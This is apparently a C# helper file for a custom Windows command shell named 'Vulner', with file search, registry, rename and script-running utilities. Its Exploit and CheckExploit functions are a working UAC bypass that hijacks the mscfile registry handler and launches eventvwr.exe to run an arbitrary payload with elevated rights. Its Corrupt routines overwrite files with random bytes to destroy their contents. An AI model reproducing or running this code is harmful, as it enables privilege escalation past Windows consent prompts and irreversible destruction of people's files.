using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Threading;
using System.Management;

namespace Vulner
{
    class Funcs
    {
        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static String BytesToString(long byteCount)
        {
            string[] suf = { "B", "KB", "MB", "GB", "TB", "PB", "EB" };
            if (byteCount == 0)
                return "0" + suf[0];
            long bytes = Math.Abs(byteCount);
            int place = Convert.ToInt32(Math.Floor(Math.Log(bytes, 1024)));
            double num = Math.Round(bytes / Math.Pow(1024, place), 1);
            return (Math.Sign(byteCount) * num).ToString() + " " + suf[place];
        }
        public static T Conv<T>(object input)
        {
            return (T)Convert.ChangeType(input, typeof(T));
        }
        public static bool MatchHost(string s)
        {
            if (new Regex(@"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\ [.]+$", RegexOptions.IgnoreCase).Match(s).Success) return true;
            if (new Regex(@"^::1\ [.]+$", RegexOptions.IgnoreCase).Match(s).Success) return true;
            return false;
        }
        public static string FindFile( string name )
        {
            string file = "";
            try
            {
                foreach (string str in Environment.GetEnvironmentVariable("path").Split(';').Concat(new string[] { Environment.CurrentDirectory }))
                {
                    if (new FileInfo(Path.Combine(str, name)).Exists)
                    {
                        file = new FileInfo(Path.Combine(str, name)).FullName;
                    }
                    try
                    {
                        foreach (string s in Directory.GetFiles(str))
                        {
                            string st = new FileInfo(s).Name;
                            if (new Regex("^" + Regex.Escape(name) + "\\.[^\\.]+").IsMatch(st))
                            {
                                file = new FileInfo(s).FullName;
                            }
                        }
                    }
                    catch (IOException) { }
                }
            }
            catch (Exception) { }
            return file;
        }
        public static string[] FindFiles(string name)
        {
            Dictionary<string, bool> file = new Dictionary<string, bool>();
            try
            {
                foreach (string str in Environment.GetEnvironmentVariable("path").Split(';').Concat(new string[] { Environment.CurrentDirectory }))
                {
                    try
                    {
                        if (new FileInfo(Path.Combine(str, name)).Exists)
                        {
                            file[new FileInfo(Path.Combine(str, name)).FullName] = true;
                        }
                    } catch(ArgumentException) { }
                    try
                    {
                        foreach (string s in Directory.GetFiles(str))
                        {
                            string st = new FileInfo(s).Name;
                            if (new Regex("^" + Regex.Escape(name) + "\\.[^\\.]+").IsMatch(st))
                            {
                                file[new FileInfo(s).FullName] = true;
                            }
                        }
                        foreach (string s in Directory.GetFiles(str))
                        {
                            string st = new FileInfo(s).Name;
                            string reg = "^" + Regex.Escape(name).Replace(@"\*", ".+").Replace(@"\?", ".") + "$";
                            if (new Regex(reg).IsMatch(st))
                            {
                                file[new FileInfo(s).FullName] = true;
                            }
                        }
                    }
                    catch (IOException) {  }
                }
            }
            catch (Exception) { }
            return file.Select(t => t.Key).ToArray();
        }
        public static string RandomName( int len )
        {
            string a = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ.";
            byte[] bts = new byte[len];
            RandomNumberGenerator.Create().GetBytes(bts);
            return new String( bts.Select(t => a[t % a.Length]).ToArray() );
        }
        public static string RandomString( int len )
        {
            string a = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvxwyz";
            byte[] bts = new byte[len];
            RandomNumberGenerator.Create().GetBytes(bts);
            return new String(bts.Select(t => a[t % a.Length]).ToArray());
        }
        public static int Rnd( int min = 0, int max = 100000 )
        {
            byte[] bt = new byte[500];
            RandomNumberGenerator.Create().GetBytes(bt);
            int a = bt.Sum<byte>(t => t);
            return a % (max - min) + min;
        }
        public static FileInfo ProcessFile( Process p )
        {
            try
            {
                return new FileInfo(p.MainModule.FileName);
            } catch(System.ComponentModel.Win32Exception)
            {
                return null;
            }
        }
        public static bool HasAttrib( FileAttributes a, FileAttributes b )
        {
            return ((int)a & (int)b) == (int)b;
        }
        public static string SpecialReadLine()
        {
            int xp = Console.CursorLeft;
            int yp = Console.CursorTop;
            Action S = () => { Console.SetCursorPosition(xp, yp); };
            Func<char,int,int> ins = (char ch, int p) =>
            {

                return 0;
            };
            Console.TreatControlCAsInput = true;

            string s = "";
            while (!s.EndsWith("\n"))
            {
                Console.CursorSize = 1;
                Console.ReadLine();
                ConsoleKeyInfo k = Console.ReadKey(true);
                S();
                Console.WriteLine(new string(Enumerable.Repeat(' ', s.Length).ToArray()));
                if ((int)k.KeyChar == 22)
                {
                    s = s + System.Windows.Forms.Clipboard.GetText();
                }
                else if ((int)k.KeyChar == 3)
                {
                    Console.WriteLine();
                    return s = "\n";
                }
                else if ((int)k.KeyChar == 8)
                {
                    s = s.Substring(0, Math.Max(0, s.Length - 1));
                }
                else
                {
                    s = s + (int)k.KeyChar;
                } 
                S();
                Console.Write(s);
            }
            return s;
        }
        public static void MagicNumber()
        {
            Dictionary<string, byte[]> MN = new Dictionary<string, byte[]>();
            MN["exe"] = new byte[] { 0x4D, 0x5A };
            MN["zip"] = new byte[] { 0x50, 0x4B };
        }
        public static Func<string, int> Corrupt(string method)
        {
            Dictionary<string, Func<string, int>> C = new Dictionary<string, Func<string, int>>();
            C["b"] = (string str) =>
            {
                FileStream f = new FileStream(str, FileMode.OpenOrCreate);
                try
                {
                    int l = (int)(Math.Min(f.Length, int.MaxValue));
                    for (int i = 0; i < 30; i++)
                    {
                        int pos = Rnd(0, l);
                        byte[] b = RandomString(Math.Min(200, l - pos)).Select(t => (byte)t).ToArray();
                        f.Position = pos;
                        f.Write(b, 0, b.Length);
                    }
                    f.Close();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    f.Close();
                    return -1;
                }
                return 0;
            };
            C["s"] = (string str) =>
            {
                FileStream f = new FileStream(str, FileMode.OpenOrCreate);
                try
                {
                    int l = (int)(Math.Min(f.Length, int.MaxValue));
                    double[] poss = new double[] { 0.00, 0.50, 0.9 };
                    for (int i = 0; i < poss.Length; i++)
                    {
                        int pos = (int)((double)l * poss[i]);
                        byte[] b = RandomString(Math.Min(300, l - pos)).Select(t => (byte)t).ToArray();
                        f.Position = pos;
                        f.Write(b, 0, b.Length);
                    }
                    f.Close();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    f.Close();
                    return -1;
                }
                return 0;
            };
            C["f"] = (string str) =>
            {
                FileStream f = new FileStream(str, FileMode.OpenOrCreate);
                try
                {
                    int l = (int)(Math.Min(f.Length, int.MaxValue));
                    bool done = false;
                    int i = 0;
                    int c = 1000;
                    while (!done)
                    {
                        if (i > l) { done = true; break; }
                        byte[] b = RandomString(Math.Min(c, l - i)).Select(t => (byte)t).ToArray();
                        f.Position = i;
                        f.Write(b, 0, b.Length);
                        i += c;
                    }
                    f.Close();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    f.Close();
                    return -1;
                }
                return 0;
            };
            try
            {
                return C[method];
            } catch(Exception) { }
            return null;
        }
        public static string[] GetFilesSmarty(string Input, bool Re, bool Recursive = false, string P = "")
        {
            try
            {
                Regex R = Re ? new Regex(Input) : new Regex("^" + Regex.Escape(Input).Replace(@"\*", ".*").Replace(@"\?", ".") + "$", RegexOptions.IgnoreCase);
                if (P == "") { P = Environment.CurrentDirectory; }
                string[] Files = Directory.GetFiles(P);
                string[] F = Equals(Files, null) ? Directory.GetFiles(Environment.CurrentDirectory) : Files;
                string[] s = F.Where(t => R.IsMatch(new FileInfo(t).Name)).ToArray();
                if (Recursive)
                {
                    foreach (string pt in Directory.GetDirectories(P))
                    {
                        DirectoryInfo di = new DirectoryInfo(pt);
                        s = s.Concat(GetFilesSmarty(Input, Re, true, di.FullName)).ToArray();
                    }
                }
                return s;
            } catch(Exception) { }
            return new string[] { };
        }
        public static string[] GetDirsSmarty(string Input, bool Re, bool Recursive = false, string P = "")
        {
            try
            {
                Regex R = Re ? new Regex(Input) : new Regex("^" + Regex.Escape(Input).Replace(@"\*", ".*").Replace(@"\?", ".") + "$", RegexOptions.IgnoreCase);
                if (P == "") { P = Environment.CurrentDirectory; }
                string[] Files = Directory.GetDirectories(P);
                string[] F = Equals(Files, null) ? Directory.GetDirectories(Environment.CurrentDirectory) : Files;
                string[] s = F.Where(t => R.IsMatch(new DirectoryInfo(t).Name)).ToArray();
                if (Recursive)
                {
                    foreach (string pt in Directory.GetDirectories(P))
                    {
                        DirectoryInfo di = new DirectoryInfo(pt);
                        s = s.Concat(GetDirsSmarty(Input, Re, true, di.FullName)).ToArray();
                    }
                }
                return s;
            }
            catch (Exception) { }
            return new string[] { };
        }
        public static void MakeKeyTree(string s, RegistryKey r = null)
        {
            RegistryKey rk = Registry.CurrentUser;
            if (!Equals(r, null)) rk = r;
            string v = "";
            foreach (string st in s.Split('\\'))
            {
                v += st;
                try
                {
                    rk.OpenSubKey(v).GetValue(null);
                }
                catch (Exception)
                {
                    rk.CreateSubKey(v);
                }
                v += '\\';
            }
        }
        public static void Exploit(string Payload)
        {
            string k = "Software\\Classes\\mscfile\\shell\\open\\command";
            MakeKeyTree(k);
            Registry.CurrentUser.OpenSubKey(k, true).SetValue("", string.Format("{0}", Payload));
            Process.Start("eventvwr.exe").WaitForExit();
            Registry.CurrentUser.DeleteSubKey(k);
        }
        public static bool CheckExploit( )
        {
            int c = Process.GetProcessesByName("tracert").Count();
            string k = "Software\\Classes\\mscfile\\shell\\open\\command";
            MakeKeyTree(k);
            Registry.CurrentUser.OpenSubKey(k, true).SetValue("", string.Format("{0}", "tracert.exe 8.8.8.8"));
            Process.Start("eventvwr.exe").WaitForExit();
            Registry.CurrentUser.DeleteSubKey(k);
            Process p;
            if (!Equals(p = Process.GetProcessesByName("tracert")[c], null))
            {
                p.Kill();
                return true;
            }
            return false;
        }
        public static string GetFile(string s)
        {
            string[] dirs = new string[]
            {
                "",
                Environment.CurrentDirectory
            };
            foreach ( string dir in dirs )
            {
                FileInfo f = new FileInfo(Path.Combine(dir, s));
                if (f.Exists)
                {
                    return f.FullName;
                }
            }
            return "";
        }
        public static void Help(TerminalController Console, Command c, string s, string[] u, Dictionary<string,string> switches = null, Dictionary<string, string> param = null)
        {
            Console.ColorWrite("$a{1}", c.Name.ToUpper(), s);
            Console.ColorWrite("$8Usage:");
            foreach (string a in u) {
                Console.ColorWrite("$7" + a.Replace("{NAME}", c.Name)); // Keeps colors
            }

            if (!Equals(switches,null) && switches.Count > 0)
            {
                Console.ColorWrite("\n$8Switches:");
                foreach (KeyValuePair<string,string> a in switches)
                {
                    Console.ColorWrite(" $a/{0} $7- {1}", a.Key, a.Value.Replace("{NAME}", c.Name));
                }
            }

            if (!Equals(param, null) && param.Count > 0)
            {
                Console.ColorWrite("\n$8Switches:");
                foreach (KeyValuePair<string, string> a in param)
                {
                    Console.ColorWrite(" $a-{0} [value] $7- {1}", a.Key, a.Value.Replace("{NAME}", c.Name));
                }
            }
        }
        public static void RegexRename(string In, string Out, TerminalController Console, bool Copy = false)
        {
            string Reg = Regex.Escape(In).Replace(@"\*", "(.+)");

            int kv = 0;
            foreach( string s in Directory.GetFiles(Environment.CurrentDirectory) )
            {
                FileInfo f = new FileInfo(s);
                Match r = Regex.Match(f.Name, Reg);
                string res = "";
                if ( r.Success )
                {
                    string[] v = new string[r.Groups.Count];
                    int i = 0;

                    foreach( Group b in r.Groups )
                    {
                        v[i++] = b.Value;
                    }
                    res = Out;
                    try
                    {
                        for (int k = 0; k < v.Length; k++)
                        {
                            res = res.Replace("$" + k, v[k]);
                        }
                        res = res.Replace("$i", kv.ToString());
                        if (Copy)
                        {
                            File.Copy(f.FullName, new FileInfo(res).FullName);
                        }
                        else
                        {
                            File.Move(f.FullName, new FileInfo(res).FullName);
                        }
                        Console.ColorWrite("$a{0} $c=> $f{1}", f.Name, res);
                    }
                    catch (Exception ex)
                    {
                        Console.ColorWrite("$c{0} $c=> $f{1} $c- Error: {2}", f.Name, res, ex.Message);
                    }
                }
                kv++;
            }
        }
        public static string GetCommandline( Process p )
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(string.Format("SELECT * FROM Win32_Process"));
            foreach( ManagementObject m in searcher.Get() )
            {
                if (int.Parse(m["handle"].ToString()) == p.Id)
                    return m["commandLine"].ToString();
            }
            return "";
        }
        public static bool RunFile(string f, Main m)
        {
            string filename = "";
            string contents = "";
            try
            {
                filename = GetFile(f);
                contents = File.ReadAllText(filename);
            } catch(Exception)
            {
                return false;
            }

            return Run(contents, m);
        }
        public static bool Run(string content, Main m)
        {
            bool header = true;
            bool stop = false;
            bool close = true;
            bool hidden = false;

            Dictionary<string, Func<string, int>> properties = new Dictionary<string, Func<string, int>>()
            {
                { "window", (s) =>
                {
                    MessageBox.Show(s);
                    if(s.ToLower() == "hidden")
                    {
                        hidden = true;
                    } else
                    {
                        hidden = false;
                    }
                    return 1;
                } },
                { "autoclose", (s) =>
                {
                    close = bool.Parse(s.ToLower());
                    return 1;
                } }
            };

            try
            {
                foreach (string s in content.Split('\n'))
                {
                    if (stop) { break; }
                    string str = s.Trim();
                    if (Regex.Match(str, @"^[\s]*$").Success) { continue; }
                    if (str.StartsWith("@") && header)
                    {
                        string att = str.Split(' ')[0].Substring(1).ToLower();
                        string val = str.Substring(att.Length + 1);
                        if (properties.ContainsKey(att))
                        {
                            properties[att].Invoke(val);
                            if (stop) { break; }
                        }
                        continue;
                    }
                    else if (header)
                    {
                        header = false;
                        if (!hidden)
                        {
                            m.Parent.Show();
                        }
                    }

                    m.RunCommand(str);
                }
            } catch(Exception)
            {
                Console.WriteLine();
            }
            if (close) { Process.GetCurrentProcess().Kill(); }
            return true;
        }
    }
}
